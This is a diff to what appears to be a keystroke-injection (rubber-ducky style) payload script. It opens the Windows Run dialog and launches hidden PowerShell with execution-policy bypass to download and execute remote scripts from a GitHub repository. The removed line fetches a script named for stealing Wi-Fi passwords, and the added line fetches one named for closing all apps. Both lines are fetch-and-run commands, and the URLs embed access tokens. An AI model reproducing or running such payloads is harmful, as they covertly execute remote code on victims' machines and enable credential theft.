@@ -12,4 +12,4 @@ REM ###################################################################
 DELAY 2000
 GUI r
 DELAY 250
-powershell -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/W-Wifi-Passwords/W-Wifi-Passwords.ps1?token=GHSAT0AAAAAACJCV62VAY3UYBE2UHBYJCM6ZJVR2UQ').Content"
+STRINGLN  powershell -w h -ep bypass "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/CloseAllApps/closeAll.ps1?token=GHSAT0AAAAAACJCV62UAR5PWPOBFEAP3QJYZJVR6EA').Content"
